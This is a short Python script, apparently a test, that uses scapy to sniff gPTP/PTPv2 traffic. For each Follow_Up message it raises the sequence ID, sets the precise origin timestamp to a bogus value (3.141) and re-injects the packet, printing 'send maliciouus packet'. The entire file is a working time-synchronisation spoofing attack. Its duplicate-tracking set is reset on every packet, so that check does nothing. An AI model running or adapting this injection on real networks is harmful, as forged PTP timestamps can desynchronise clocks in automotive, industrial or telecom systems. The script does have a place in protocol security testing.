from scapy.all import *
from gptp.layers import PTPv2
from gptp.fields import TimestampField

# test
def packet_callback(packet):
    used_seq_ids = set()
    if packet.haslayer('PTPv2'):
        ptp_packet = packet[PTPv2]
        if packet[PTPv2].is_followup and packet[PTPv2].sequenceId not in used_seq_ids:
            used_seq_ids.add(packet[PTPv2].sequenceId)
            print("original packet")
            print(packet[PTPv2].show())
            packet[PTPv2].sequenceId = packet[PTPv2].sequenceId + 1
            packet[PTPv2].preciseOriginTimestamp = TimestampField("preciseOriginTimestamp", 0).any2i(None, 3.141)
            sendp(packet)
            print("send maliciouus packet")
            print(packet[PTPv2].show())
       # print(packet[PTPv2].sequenceId)

sniff(prn=packet_callback, count=1000)

